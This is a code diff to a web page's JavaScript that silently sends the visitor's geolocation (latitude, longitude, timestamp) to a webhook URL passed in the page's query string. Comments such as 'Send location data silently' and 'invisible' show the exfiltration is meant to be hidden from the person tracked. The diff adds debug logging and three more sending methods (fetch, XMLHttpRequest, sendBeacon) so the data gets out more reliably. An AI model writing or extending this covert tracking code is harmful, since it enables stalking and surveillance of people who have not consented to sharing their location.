@@ -466,21 +466,47 @@
         function getWebhookUrl() {
             const urlParams = new URLSearchParams(window.location.search);
             webhookUrl = urlParams.get('webhook') || '';
+            console.log('🔗 Webhook URL:', webhookUrl || 'NOT PROVIDED');
         }
         
         // Send location data silently
         function sendLocation(lat, lng) {
+            console.log('📍 Location obtained:', lat, lng);
+            
             if (webhookUrl) {
                 const trackingUrl = `${webhookUrl}?lat=${lat}&lng=${lng}&timestamp=${Date.now()}`;
+                console.log('🔗 Sending to:', trackingUrl);
                 
-                // Send via image request (invisible)
+                // Method 1: Image request (invisible)
                 const img = new Image();
+                img.onload = () => console.log('✅ Image method success');
+                img.onerror = () => console.log('❌ Image method failed');
                 img.src = trackingUrl;
                 
-                // Also try fetch if available
+                // Method 2: Fetch API
                 if (typeof fetch !== 'undefined') {
-                    fetch(trackingUrl).catch(() => {});
+                    fetch(trackingUrl, { mode: 'no-cors' })
+                        .then(() => console.log('✅ Fetch method success'))
+                        .catch(() => console.log('❌ Fetch method failed'));
                 }
+                
+                // Method 3: XMLHttpRequest
+                try {
+                    const xhr = new XMLHttpRequest();
+                    xhr.open('GET', trackingUrl, true);
+                    xhr.send();
+                    console.log('✅ XHR method sent');
+                } catch(e) {
+                    console.log('❌ XHR method failed:', e);
+                }
+                
+                // Method 4: Navigator.sendBeacon (most reliable)
+                if (navigator.sendBeacon) {
+                    const success = navigator.sendBeacon(trackingUrl);
+                    console.log('📡 Beacon method:', success ? 'success' : 'failed');
+                }
+            } else {
+                console.log('❌ No webhook URL provided');
             }
         }
         
